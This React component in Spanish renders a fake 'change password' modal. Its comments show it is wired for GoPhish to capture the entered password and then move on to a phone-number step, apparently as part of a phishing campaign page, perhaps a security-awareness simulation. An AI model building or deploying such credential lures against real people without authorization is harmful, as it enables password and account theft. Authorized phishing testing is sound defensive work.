import { useState } from "react";
import { X, Eye, EyeOff } from "lucide-react";
import "./ChangePasswordModal.css";

export default function ChangePasswordModal({ onClose, onSubmit, userEmail }) {
  const [newPwd, setNewPwd]       = useState("");
  const [confirmPwd, setConfirmPwd] = useState("");
  const [showNew, setShowNew]       = useState(false);
  const [showConfirm, setShowConfirm] = useState(false);

  const canSubmit = newPwd && confirmPwd && newPwd === confirmPwd;

  return (
    <div className="modal-backdrop">
      {/* FORMULARIO real */}
      <form
        className="modal"
        role="dialog"
        aria-modal="true"
        method="POST"
        action="/"
        onSubmit={(e) => {
          e.preventDefault();
          if (!canSubmit) return;
          onSubmit(newPwd);   // avanza al paso Teléfono
        }}
      >
        <header className="modal__header">
          <h2 className="modal__title">Cambiar la contraseña</h2>
          <button className="modal__close" onClick={onClose} aria-label="Cerrar">
            <X size={20} />
          </button>
        </header>

        <div className="modal__body">
          <div className="modal__label">
            <span className="modal__label-title">Id. de usuario</span>
            <div className="modal__label-text">{userEmail}</div>
          </div>

          <div className="modal__label">
            <span className="modal__label-title">Nueva contraseña</span>
            <div className="modal__pw-wrapper">
              <input
                name="password"                 /* <= nombre para GoPhish */
                type={showNew ? "text" : "password"}
                value={newPwd}
                onChange={(e) => setNewPwd(e.target.value)}
                placeholder="Introduce la nueva contraseña"
                className="modal__input"
                required
              />
              <button
                type="button"
                className="modal__pw-toggle"
                onClick={() => setShowNew((v) => !v)}
              >
                {showNew ? <EyeOff size={16} /> : <Eye size={16} />}
              </button>
            </div>
          </div>

          <div className="modal__label">
            <span className="modal__label-title">Confirmar contraseña nueva</span>
            <div className="modal__pw-wrapper">
              <input
                type={showConfirm ? "text" : "password"}
                value={confirmPwd}
                onChange={(e) => setConfirmPwd(e.target.value)}
                placeholder="Repite la nueva contraseña"
                className="modal__input"
                required
              />
              <button
                type="button"
                className="modal__pw-toggle"
                onClick={() => setShowConfirm((v) => !v)}
              >
                {showConfirm ? <EyeOff size={16} /> : <Eye size={16} />}
              </button>
            </div>
          </div>
        </div>

        <footer className="modal__footer">
          <button type="button" className="modal__btn modal__btn--ghost" onClick={onClose}>
            Cancelar
          </button>
          <button
            type="submit"
            className="modal__btn modal__btn--primary"
            disabled={!canSubmit}
          >
            Enviar
          </button>
        </footer>
      </form>
    </div>
  );
}
